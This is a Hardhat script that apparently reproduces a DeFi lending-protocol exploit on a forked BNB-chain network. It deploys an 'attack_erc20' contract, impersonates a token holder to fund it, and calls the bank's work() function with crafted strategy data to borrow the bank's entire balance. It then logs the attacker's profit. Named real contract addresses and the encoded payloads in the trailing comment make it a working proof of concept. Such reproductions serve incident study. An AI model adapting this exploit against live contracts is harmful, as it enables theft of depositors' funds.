const hre = require("hardhat");



async function main() {

    const BUSD = "0x55d398326f99059fF775485246999027B3197955";
    const BUSD_HOLDER = '0xEFDca55e4bCE6c1d535cb2D0687B5567eEF2AE83';
    const BANK_ADDR = '0xc18907269640D11E2A91D7204f33C5115Ce3419e';
    const STRATEGY = '0x5085c49828b0b8e69bae99d96a8e0fcf0a033369'

    let Hack = await hre.ethers.getContractFactory("attack_erc20");
    const hack = await Hack.deploy();
    await hack.deployed();
    console.log("attack contract deployed to:", hack.address);


    await hre.network.provider.request({
        method: "hardhat_impersonateAccount",
        params: [BUSD_HOLDER],
    });
    const signer = await hre.ethers.getSigner(BUSD_HOLDER)
    const IERC20 = await hre.ethers.getContractAt("contracts/attack.sol:IERC20", BUSD, signer);
    let amount = await IERC20.balanceOf(BUSD_HOLDER);
    let tx = await IERC20.transfer(hack.address, amount);
    console.log('Transfer %s BUSD from %s to %s', amount, BUSD_HOLDER, hack.address);

    await hack.init();
    let pairAddr = await hack.pair();
    const IBANK = await hre.ethers.getContractAt("contracts/attack.sol:IBANK", BANK_ADDR, signer);

    let data = hre.ethers.utils.defaultAbiCoder.encode(['address', 'uint', 'uint', 'address' ,'uint'], [STRATEGY, 0x40, 0x40 ,pairAddr, 2]);
    console.log("data: ", data);

    let borrowAmount = await IERC20.balanceOf(BANK_ADDR);
    await IBANK.work(0, 15, borrowAmount, data);
    console.log("step 2");
    await hack.payday();
    let before = await hack.BUSDBalanceBefore();
    let after = await hack.BUSDBalanceAfter();
    let Mbefore = await hack.Mbefore();
    let Mafter = await hack.Mafter();
    console.log("attacker BUSD before: ", before);
    console.log("attacker BUSD after:  ", after);
    console.log("attacker Mbefore: ", Mbefore);
    console.log("attacker Mafter:  ", Mafter);

}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
/*
0000000000000000000000005085c49828b0b8e69bae99d96a8e0fcf0a033369
0000000000000000000000000000000000000000000000000000000000000040
0000000000000000000000000000000000000000000000000000000000000040
000000000000000000000000c6015317c28cdd60c208fbc58977e77eed534b3a
0000000000000000000000000000000000000000000000000000000000000002

0000000000000000000000005085c49828b0b8e69bae99d96a8e0fcf0a033369
0000000000000000000000000000000000000000000000000000000000000040
0000000000000000000000000000000000000000000000000000000000000040
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000002
*/